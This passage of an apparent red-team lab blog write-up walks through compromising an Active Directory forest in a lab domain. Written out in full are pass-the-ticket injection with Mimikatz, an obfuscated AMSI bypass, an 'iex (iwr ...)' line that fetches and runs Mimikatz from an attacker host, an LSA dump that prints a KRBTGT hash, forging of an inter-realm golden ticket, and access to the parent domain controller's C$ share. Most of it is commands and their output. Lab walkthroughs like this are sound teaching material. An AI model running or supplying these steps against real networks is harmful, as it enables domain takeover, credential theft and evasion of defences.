+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1755</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-0-3-40a50000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>LDAP-nebula-dc.nebula.cosmos.local.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1583</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-2-0-60a10000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1583</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-2-1-40e10000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span></code></pre></div><h3 id="injecting-ticket-into-lsass">injecting ticket into LSASS</h3>
+<p>this ticket <code>[0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi</code> can be injected into the LSASS by a <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket"  target="_blank" rel="noreferrer nofollow">&ldquo;pass-the-ticket&rdquo;</a>
+ technique.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::ptt C:\users\devmanager\desktop\tickets\[0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi&#34;&#39;</span>
+</span></span></code></pre></div><p>with the injected ticket, i established a PowerShell remote session to the Nebula Domain Controller:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$Sess</span> <span style="color:#ff79c6">=</span> New-PSSession -ComputerName Nebula-DC.Nebula.Cosmos.Local
+</span></span><span style="display:flex;"><span>Enter-PSSession -Session <span style="color:#8be9fd;font-style:italic">$sess</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::ptt C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcosmos.com / http://mysmartlogon.com   ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># kerberos::ptt C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* File: <span style="color:#f1fa8c">&#39;C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi&#39;</span>: OK
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt; <span style="color:#8be9fd;font-style:italic">$sess</span> <span style="color:#ff79c6">=</span> New-PSSession -ComputerName nebula-dc.nebula.cosmos.local
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt; Enter-PSSession -Session <span style="color:#8be9fd;font-style:italic">$sess</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>nebula<span style="color:#f1fa8c">\a</span>dministrator
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt; hostname
+</span></span><span style="display:flex;"><span>nebula-dc
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>i now have command execution on the domain controller.</p>
+<h2 id="target-6">target 6</h2>
+<h3 id="forest-domination">forest domination</h3>
+<p>recall that the parent and child domains have a two-way (bidirectional) trust relationship. this means that there are a couple of ways to escalate privileges to another domain within the same forest. i&rsquo;m going to use the <a href="https://www.netwrix.com/how_golden_ticket_attack_works.html"  target="_blank" rel="noreferrer nofollow"><code>KRBTGT</code> hash</a>
+ way.</p>
+<h3 id="dumping-the-hash">dumping the hash</h3>
+<p>using mimikatz, i can dump the KRBTGT hash from the Nebula Domain Controller:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;lsadump::lsa /patch&#34;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt; S<span style="color:#f1fa8c">`</span>eT-It<span style="color:#f1fa8c">`</span>em <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#39;V&#39;</span>+<span style="color:#f1fa8c">&#39;aR&#39;</span> + <span style="color:#f1fa8c">&#39;IA&#39;</span> + <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;b&#39;</span>+<span style="color:#f1fa8c">&#39;lE:1&#39;</span>+<span style="color:#f1fa8c">&#39;q2&#39;</span><span style="color:#ff79c6">)</span> + <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;uZ&#39;</span>+<span style="color:#f1fa8c">&#39;x&#39;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span> <span style="color:#ff79c6">[</span>TYpE<span style="color:#ff79c6">](</span><span style="color:#f1fa8c">&#34;{1}{0}&#34;</span>-F<span style="color:#f1fa8c">&#39;F&#39;</span>,<span style="color:#f1fa8c">&#39;rE&#39;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> ; <span style="color:#ff79c6">(</span> GeT-VariaBle <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;1Q2U&#34;</span>+<span style="color:#f1fa8c">&#34;zX&#34;</span><span style="color:#ff79c6">)</span> -VaL <span style="color:#ff79c6">)</span>.<span style="color:#f1fa8c">&#34;A`ss`Embly&#34;</span>.<span style="color:#f1fa8c">&#34;GET`TY`Pe&#34;</span><span style="color:#ff79c6">((</span> <span style="color:#f1fa8c">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> -f<span style="color:#f1fa8c">&#39;Util&#39;</span>,<span style="color:#f1fa8c">&#39;A&#39;</span>,<span style="color:#f1fa8c">&#39;Amsi&#39;</span>,<span style="color:#f1fa8c">&#39;.Management.&#39;</span>,<span style="color:#f1fa8c">&#39;utomation.&#39;</span>,<span style="color:#f1fa8c">&#39;s&#39;</span>,<span style="color:#f1fa8c">&#39;System&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span>.<span style="color:#f1fa8c">&#34;g`etf`iElD&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;{0}{2}{1}&#34;</span> -f<span style="color:#f1fa8c">&#39;amsi&#39;</span>,<span style="color:#f1fa8c">&#39;d&#39;</span>,<span style="color:#f1fa8c">&#39;InitFaile&#39;</span> <span style="color:#ff79c6">)</span>,<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;{2}{4}{0}{1}{3}&#34;</span> -f <span style="color:#f1fa8c">&#39;Stat&#39;</span>,<span style="color:#f1fa8c">&#39;i&#39;</span>,<span style="color:#f1fa8c">&#39;NonPubli&#39;</span>,<span style="color:#f1fa8c">&#39;c&#39;</span>,<span style="color:#f1fa8c">&#39;c,&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;sE`T`VaLUE&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">n</span><span style="color:#f1fa8c">`</span>ULl<span style="color:#ff79c6">}</span>,<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">t</span><span style="color:#f1fa8c">`</span>RuE<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt; iex <span style="color:#ff79c6">(</span>iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>nebula-dc.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>ocuments&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;lsadump::lsa /patch&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcosmos.com / http://mysmartlogon.com   ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># lsadump::lsa /patch</span>
+</span></span><span style="display:flex;"><span>Domain : NEBULA / S-1-5-21-771755520-687805270-358672322
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f4 <span style="color:#ff79c6">(</span>500<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>User : Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f5 <span style="color:#ff79c6">(</span>501<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>User : Guest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f6 <span style="color:#ff79c6">(</span>502<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>User : krbtgt
+</span></span><span style="display:flex;"><span>NTLM : a3a127f4537798da6586372093fdffb4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f7 <span style="color:#ff79c6">(</span>503<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>User : DefaultAccount
+</span></span></code></pre></div><p>here&rsquo;s the hash i&rsquo;m interested in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>RID  : 000001f6 <span style="color:#ff79c6">(</span>502<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>User : krbtgt
+</span></span><span style="display:flex;"><span>NTLM : a3a127f4537798da6586372093fdffb4
+</span></span></code></pre></div><h3 id="forging-the-inter-realm-tgt">forging the inter-realm TGT</h3>
+<p>armed with this, i can then forge the inter-realm TGT. an inter-realm TGT is a special ticket given by a domain controller to a user attempting to access a service in a trusted domain. this TGT is encrypted with a shared key that both domains have agreed upon. the TGT is presented to the DC of the trusted domain to get a service ticket (TGS). once the inter-realm TGT is validated, the DC issues a TGS, that then grants the user access to the server. you can read more about Microsoft&rsquo;s Trust Technologies <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554%28v=ws.10%29?redirectedfrom=MSDN"  target="_blank" rel="noreferrer nofollow">here</a>
+.</p>
+<p>using PowerView, i can enumerate the domain SID and Enterprise Admins SID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Get-DomainSID
+</span></span><span style="display:flex;"><span>Get-NetGroupMember -GroupName <span style="color:#f1fa8c">&#34;Enterprise Admins&#34;</span> –Domain cosmos.local
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools&gt;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools&gt; Get-Domainsid
+</span></span><span style="display:flex;"><span>S-1-5-21-771755520-687805270-358672322
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools&gt; Get-NetGroupMember -GroupName <span style="color:#f1fa8c">&#34;enterprise admins&#34;</span> -Domain cosmos.local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GroupDomain   : cosmos.local
+</span></span><span style="display:flex;"><span>GroupName     : Enterprise Admins
+</span></span><span style="display:flex;"><span>MemberDomain  : cosmos.local
+</span></span><span style="display:flex;"><span>MemberName    : Administrator
+</span></span><span style="display:flex;"><span>MemberSID     : S-1-5-21-1458491649-1432147247-1990877046-500
+</span></span><span style="display:flex;"><span>IsGroup       : False
+</span></span><span style="display:flex;"><span>MemberDN      : <span style="color:#8be9fd;font-style:italic">CN</span><span style="color:#ff79c6">=</span>Administrator,CN<span style="color:#ff79c6">=</span>Users,DC<span style="color:#ff79c6">=</span>cosmos,DC<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">local</span>
+</span></span></code></pre></div><p>i can then forge my inter-realm TGT.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:&lt;sid of the current domain&gt; /sids:&lt;SID of the Enterprise Admins group of parent domain&gt; /krbtgt:&lt;hash&gt; /ticket: C:&lt;path&gt;&#34;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; iex <span style="color:#ff79c6">(</span>iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\ticket\krbtgt_tkt.kirbi&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ /</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcosmos.com / http://mysmartlogon.com   ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\ticket\krbtgt_tkt.kirbi</span>
+</span></span><span style="display:flex;"><span>User      : Administrator
+</span></span><span style="display:flex;"><span>Domain    : nebula.cosmos.local <span style="color:#ff79c6">(</span>NEBULA<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>SID       : S-1-5-21-771755520-687805270-358672322
+</span></span><span style="display:flex;"><span>User Id   : <span style="color:#bd93f9">500</span>
+</span></span><span style="display:flex;"><span>Groups Id : *513 <span style="color:#bd93f9">512</span> <span style="color:#bd93f9">520</span> <span style="color:#bd93f9">518</span> <span style="color:#bd93f9">519</span>
+</span></span><span style="display:flex;"><span>Extra SIDs: S-1-5-21-1458491649-1432147247-1990877046-500 ;
+</span></span><span style="display:flex;"><span>ServiceKey: a3a127f4537798da6586372093fdffb4 - rc4_hmac_nt
+</span></span><span style="display:flex;"><span>Lifetime  : 7/3/2024 3:15:08 PM ; 7/1/2031 3:15:08 PM ; 7/1/2031 3:15:08 PM
+</span></span><span style="display:flex;"><span>-&gt; Ticket : ticket.kirbi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * PAC generated
+</span></span><span style="display:flex;"><span> * PAC signed
+</span></span><span style="display:flex;"><span> * EncTicketPart generated
+</span></span><span style="display:flex;"><span> * EncTicketPart encrypted
+</span></span><span style="display:flex;"><span> * KrbCred generated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Final Ticket Saved to file !
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#f1fa8c">\t</span>icket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         7/3/2024   3:15 PM           <span style="color:#bd93f9">1499</span> ticket.kirbi
+</span></span></code></pre></div><p>armed with this forged ticket, i injected it into our current session using the &ldquo;Pass the Ticket&rdquo; technique:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::ptt C:\ticket\ticket.kirbi&#34;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::ptt C:\ticket\krbtgt_tkt.kirbi&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcosmos.com / http://mysmartlogon.com   ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># kerberos::ptt C:\ticket\krbtgt_tkt.kirbi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* File: <span style="color:#f1fa8c">&#39;C:\ticket\krbtgt_tkt.kirbi&#39;</span>: ERROR kuhl_m_kerberos_ptt_file ; kuhl_m_file_readData <span style="color:#ff79c6">(</span>0x00000002<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;kerberos::ptt C:\ticket\ticket.kirbi&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcosmos.com / http://mysmartlogon.com   ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># kerberos::ptt C:\ticket\ticket.kirbi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* File: <span style="color:#f1fa8c">&#39;C:\ticket\ticket.kirbi&#39;</span>: OK
+</span></span></code></pre></div><p>just to confirm successful forest compromise, i attempted to access the <code>C$</code> share on the <code>Cosmos-DC</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls <span style="color:#f1fa8c">\\</span>cosmos-dc.cosmos.local<span style="color:#f1fa8c">\c</span>$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt; ls <span style="color:#f1fa8c">\\</span>cosmos-dc.cosmos.local<span style="color:#f1fa8c">\c</span>$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: <span style="color:#f1fa8c">\\</span>cosmos-dc.cosmos.local<span style="color:#f1fa8c">\c</span>$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         7/29/2023   1:55 AM                PerfLogs
+</span></span><span style="display:flex;"><span>d-r---         1/24/2023   9:35 PM                Program Files
+</span></span><span style="display:flex;"><span>d-----         7/16/2023   6:23 AM                Program Files <span style="color:#ff79c6">(</span>x86<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>d-r---         9/15/2023   5:55 AM                Transcripts
+</span></span><span style="display:flex;"><span>d-r---          9/2/2023  11:20 PM                Users
+</span></span><span style="display:flex;"><span>d-----         8/21/2023  11:47 PM                Windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\t</span>icket&gt;
+</span></span></code></pre></div><p>successfully listing the contents of the <code>C$</code> share on the Cosmos Domain Controller, demonstrates complete forest compromise!</p>
+</main>
+</div>
+
+
+    <br>
+    <hr>
+    
+      Next: <a href="//localhost:1313/posts/cosmos-1/">cosmos, part 1: red-teaming corporate active directory forests</a>
+    
+
+
+
+
+<footer>
+  <div class="footer-nav">
+    
+    <a class="next" href="/posts/sunday-scaries/" style="float: right"
+      >next: sunday scaries: exploiting web apps</a
+    >
+     
+    <a class="previous" href="/posts/cosmos-1/">previous</a>
+    
+  </div>
